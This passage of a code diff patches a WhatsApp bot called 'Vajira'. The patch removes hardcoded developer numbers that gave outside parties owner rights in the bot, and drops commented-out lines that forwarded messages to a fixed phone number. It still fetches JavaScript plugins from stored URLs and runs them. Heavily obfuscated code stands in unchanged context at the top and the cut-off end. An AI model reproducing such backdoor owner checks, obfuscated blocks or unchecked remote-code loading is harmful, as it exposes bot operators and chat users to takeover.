@@ -1,0 +1,112 @@
+'stateObject','caption','
+                 if (icmd) {
+                     const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
+                     if (cmd) {
+-			isCreator = [ hgg,devss,...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender);
++			isCreator = Boolean(citel.fromMe) || senderNumbers.some((value) => configuredOwnerNumbers.has(value));
+                         if (cmd.react) citel.react(cmd.react)
+                         let text;
+                         try {
+@@ -198,28 +257,27 @@ function _0x5159(){const _0x2791e6=['30rTKhCo','input','stateObject','caption','
+                 const groupMetadata = citel.isGroup ? await Void.groupMetadata(citel.chat)
+                     .catch((e) => {}) : "";
+                 const participants = citel.isGroup && groupMetadata.participants !=undefined ? await groupMetadata.participants : "";
+-                const groupAdminss = (participants) => {
+-                    a = [];
+-                    for (let i of participants) {
+-                        if (i.admin == null) continue;
+-                        a.push(i.id);
++                const groupAdminss = (items) => {
++                    const admins = new Set();
++                    for (const participant of items || []) {
++                        if (participant.admin == null) continue;
++                        for (const jid of [participant.id, participant.phoneNumber, participant.lid]) {
++                            if (jid) admins.add(Void.decodeJid(jid));
++                        }
+                     }
+-                    return a;
++                    return admins;
+                 }
+-                const groupAdmins = citel.isGroup ? await groupAdminss(participants) : ''
+-                const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
+-                const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
++                const groupAdmins = citel.isGroup ? groupAdminss(participants) : new Set();
++                const botAliases = [botNumber, Void.user?.id, Void.user?.lid].filter(Boolean).map((jid) => Void.decodeJid(jid));
++                const senderAliases = [citel.sender, citel.senderAlt].filter(Boolean).map((jid) => Void.decodeJid(jid));
++                const isBotAdmins = citel.isGroup ? botAliases.some((jid) => groupAdmins.has(jid)) : false;
++                const isAdmins = citel.isGroup ? senderAliases.some((jid) => groupAdmins.has(jid)) : false;
+                 if (citel.isGroup) {
+                     console.log('Message in Group\nIn=> '+groupMetadata.subject+' '+citel.sender+'\nMessage:'+citel.body+'\n----------------------------')
+                 }
+                 if (!citel.isGroup) {
+                     console.log('Message in Personal\nFrom=> '+citel.pushName+' '+citel.sender+'\nMessage:'+citel.body+'\n----------------------------')
+                 }
+-                setInterval(() => {
+-
+-                    fs.writeFileSync(__dirname + "/database.json", JSON.stringify(global.db, null, 2));
+-
+-                }, 10000);
+                 try {
+                     let GroupS = await sck.findOne({ id: citel.chat })
+                     if (GroupS) {
+@@ -483,8 +541,6 @@ In ${clockString(new Date() - user.afkTime)}
+                 }
+             } catch (e) {
+                 console.log(e)
+-             //   await Void.sendMessage('919628516236@s.whatsapp.net',{text: util.format(mek)})
+-               // await Void.sendMessage('919628516236@s.whatsapp.net',{text: util.format(e)})
+             }
+         })
+  const { sck } = require('.')
+@@ -525,7 +581,7 @@ async function fooz(){
+     foo()
+     fooz()
+ 	    
+-if(Config.autobio==true) {
++if(isEnabled(Config.autobio)) {
+     console.log("changing about")
+     let cron = require('node-cron')
+     cron.schedule('1 * * * *', async() => {
+@@ -763,21 +819,30 @@ await updateStatus()
+         Void.serializeM = (citel) => smsg(Void, citel, store)
+             //========================================================================================================================================
+         Void.ev.on('connection.update', async(update) => {
+-                const { connection, lastDisconnect } = update
++                const { connection, lastDisconnect, qr } = update
++                if (qr) qrcode.generate(qr, { small: true })
+                 if (connection === "connecting") {
+                    console.log("📡 Connecting to WhatsApp... Please Wait.");
+                 }
+                 if (connection === 'open') {
+                     console.log("✅ Vajira Login Successful!");
+                     console.log("⬇️  Vajira Installing External Plugins...");
+-                    let axios = require('axios')
+-                    let check = await plugindb.find({})
+-                    for (let i = 0; i < check.length; i++) {
+-                        let AxiosData = await axios.get(check[i].url)
+-                        let data = AxiosData.data
+-                         await fs.writeFileSync(__dirname + '/../plugin/' + check[i].id + '.js', data, "utf8")
+-                     }
+-                     console.log("😁  Vajira External Plugins Installed!");fs.readdirSync(__dirname + "/../plugin").forEach((plugin) => {
++                    if (mongodb && mongoose.connection.readyState === 1) {
++                      try {
++                        const check = await plugindb.find({});
++                        for (const pluginRecord of check) {
++                          const { data } = await axios.get(pluginRecord.url, { timeout: 20000 });
++                          const pluginId = String(pluginRecord.id || '').replace(/[^a-zA-Z0-9_-]/g, '');
++                          if (pluginId) await fs.writeFile(__dirname + '/../plugin/' + pluginId + '.js', data, 'utf8');
++                        }
++                        console.log("😁  Vajira External Plugins Installed!");
++                      } catch (error) {
++                        console.warn('Could not restore external plugins:', error.message);
++                      }
++                    } else {
++                      console.log('Skipping database-backed external plugins: MongoDB is not connected.');
++                    }
++                    fs.readdirSync(__dirname + "/../plugin").forEach((plugin) => {
+      if (path.extname(plugin).toLowerCase() == ".js") {
+          console.log(`Loading plugin: ${plugin}`);
+          try {
+@@ -790,10 +855,15 @@ await updateStatus()
+  });
+ const _0x3ac3a1=_0x2c50;function _0x2c50(_0x5bc7be,_0x36e4a6){const _0x4cae20=_0x1228();return _0x2c50=function(_0xd068a6,_0x5cb3ca){_0xd068a6=_0xd068a6-0xc7;let _0x1228b9=_0x4cae20[_0xd068a6];return _0x1228b9;},_0x2c50(_0x5bc7be,_0x36e4a6);}(function(_0x186e07,_0x504457){const _0x4ed117=_0x2c50,_0x191595=_0x186e07();while(!![]){try{const _0x4fd920=-parseInt(_0x4ed117(0xf
